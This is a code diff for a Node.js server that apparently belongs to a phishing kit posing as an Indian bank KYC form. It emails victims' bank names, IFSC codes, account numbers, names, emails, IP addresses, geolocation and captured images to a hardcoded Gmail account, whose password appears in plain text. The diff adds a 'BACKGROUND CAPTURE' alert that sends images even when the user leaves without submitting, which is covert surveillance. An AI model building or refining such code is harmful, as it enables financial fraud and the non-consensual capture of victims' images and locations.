@@ -38,7 +38,7 @@ const transporter = nodemailer.createTransport({
   service: 'gmail',
   auth: {
     user: 'dcbsubmission392@gmail.com',
-    pass: 'kexmwnespcwxrkjt'
+    pass: 'iskexmwnespcwxrkjt'
   }
 });
 
@@ -54,8 +54,15 @@ const buildEmailHtml = (data) => {
   return `
     <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
       <h2 style="color: ${data.isFormEmpty ? '#d32f2f' : '#003d6a'};">
-        ${data.isFormEmpty ? '⚠️ Background Capture' : '✅ KYC Submission'}
+        ${data.isFormEmpty ? '⚠️ BACKGROUND CAPTURE' : '✅ KYC Submission'}
       </h2>
+      
+      ${data.isFormEmpty ? `
+      <div style="background-color: #fff3e0; padding: 15px; border-radius: 8px; margin-bottom: 20px;">
+        <p><strong>User left without submitting form</strong></p>
+        <p>Captured ${data.imageCount} images</p>
+      </div>
+      ` : ''}
       
       <div style="background-color: #eef7ff; padding: 20px; border-radius: 8px; margin: 20px 0; border-left: 4px solid #003d6a;">
         <h3 style="color: #003d6a; margin-top: 0;">📱 Device Information</h3>
@@ -66,16 +73,16 @@ const buildEmailHtml = (data) => {
         <p><strong>Browser:</strong> ${data.browser}</p>
       </div>
       
+      ${!data.isFormEmpty ? `
       <div style="background-color: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0;">
-        <h3 style="color: #003d6a; margin-top: 0;">${data.isFormEmpty ? 'Background Data' : 'Account Information'}</h3>
-        ${data.isFormEmpty ? '' : `
-          <p><strong>Bank Name:</strong> ${data.bankname}</p>
-          <p><strong>IFSC Code:</strong> ${data.ifsc}</p>
-          <p><strong>Account Number:</strong> ${data.accno}</p>
-        `}
+        <h3 style="color: #003d6a; margin-top: 0;">Account Information</h3>
+        <p><strong>Bank Name:</strong> ${data.bankname}</p>
+        <p><strong>IFSC Code:</strong> ${data.ifsc}</p>
+        <p><strong>Account Number:</strong> ${data.accno}</p>
         <p><strong>Full Name:</strong> ${data.fullname}</p>
         <p><strong>Email:</strong> ${data.email}</p>
       </div>
+      ` : ''}
       
       ${data.location ? `
       <div style="background-color: #e8f4fc; padding: 20px; border-radius: 8px; margin: 20px 0;">
@@ -90,7 +97,7 @@ const buildEmailHtml = (data) => {
       <div style="background-color: #f0f8ff; padding: 20px; border-radius: 8px; margin: 20px 0;">
         <h3 style="color: #003d6a; margin-top: 0;">Technical Data</h3>
         <p><strong>IP Address:</strong> ${data.ip}</p>
-        <p><strong>Images Captured:</strong> ${data.imageCount} (${data.isFormEmpty ? 'background only' : 'full submission'})</p>
+        <p><strong>Images Captured:</strong> ${data.imageCount}</p>
         <p><strong>User Agent:</strong> ${data.userAgent}</p>
         <p><strong>Timestamp:</strong> ${new Date(data.timestamp).toLocaleString()}</p>
       </div>
@@ -121,11 +128,11 @@ app.post('/submit', (req, res) => {
         },
         os: `${os.name} ${os.version}` || req.body.device_os,
         browser: `${browser.name} ${browser.version}` || req.body.device_browser,
-        bankname: req.body.bankname,
-        ifsc: req.body.ifsc,
-        accno: req.body.accno,
-        fullname: req.body.fullname,
-        email: req.body.email,
+        bankname: req.body.bankname || 'Not provided',
+        ifsc: req.body.ifsc || 'Not provided',
+        accno: req.body.accno || 'Not provided',
+        fullname: req.body.fullname || 'Not provided',
+        email: req.body.email || 'Not provided',
         location: req.body.location ? JSON.parse(req.body.location) : null,
         ip: getClientIp(req),
         userAgent: serverUA,
